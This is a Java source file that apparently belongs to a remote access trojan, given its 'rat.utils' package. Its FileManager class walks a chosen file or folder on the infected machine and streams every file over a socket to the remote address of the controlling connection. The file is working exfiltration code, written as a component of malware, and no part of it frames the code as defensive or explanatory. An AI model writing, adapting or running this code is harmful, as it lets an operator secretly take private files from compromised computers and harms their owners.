package rat.utils;


import org.jboss.netty.channel.Channel;
import rat.packets.FileDataPacket;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class FileManager {

    private static void downloadFolder(String folderPath, String parentFolder, Channel channel, int transferPort) {
        try {
            Path start = Paths.get(folderPath);
            Files.walkFileTree(start, new SimpleFileVisitor<Path>() {
                @Override
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                    downloadFile(file.toFile().getAbsolutePath(), parentFolder, channel, transferPort);
                    return FileVisitResult.CONTINUE;
                }
            });
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void downloadFile(String filePath, String parentFolder, Channel channel, int transferPort) {
        Path file = Paths.get(filePath);
        Path folder = Paths.get(parentFolder);
        String relative = folder.relativize(file).toString();

        long totLen = file.toFile().length();

        byte[] bytes = new byte[4096];

        InetSocketAddress address = (InetSocketAddress) channel.getRemoteAddress();
        try (Socket socket = new Socket(address.getAddress(), transferPort)) {

            /* Send FileDataPacket */
            ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
            oos.writeObject(new FileDataPacket(relative, totLen));

            OutputStream out = socket.getOutputStream();
            File f = file.toFile();
            InputStream in = new FileInputStream(f);

            int count;
            while ((count = in.read(bytes)) > 0) {
                out.write(bytes, 0, count);
            }

            out.close();

        } catch (IOException ex) {
            ex.printStackTrace();
        }

        System.out.println("File written!");
    }

    public static void downloadFiles(String path, String parentFolder, Channel channel, int transferPort) {
        File file = new File(path);
        if (!file.exists()) {
            return;
        }

        if (file.isDirectory()) {
            downloadFolder(path, parentFolder, channel, transferPort);
        } else {
            downloadFile(path, parentFolder, channel, transferPort);
        }
    }

//    public static void storeData(FileDataPacket packet) {
//        try {
//            String path = new File(".").getCanonicalPath();
//            String packetPath = extractRelativePath(packet, !path.endsWith(File.separator));
//
//            File file = new File(path + packetPath);
//            if (!file.getParentFile().exists()) {
//                file.getParentFile().mkdirs();
//            }
//
//            FileOutputStream out = new FileOutputStream(file, true);
//            out.write(packet.getData(), 0, packet.getCount());
//
//            //  System.out.println("Path: " + file.getPath() + " size: " + file.length() + " total size: " + packet
// .getTotalSize());
//
//            out.close();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//    }

    public static String extractRelativePath(FileDataPacket packet, boolean useSlash) {
        String res = packet.getRelativePath().replaceAll(
                Pattern.quote(packet.getSeparator()), Matcher.quoteReplacement(File.separator)
        );

        String result = (res.startsWith(File.separator) ? "" : File.separator) + res;

        return useSlash ? result : result.substring(1);
    }
}
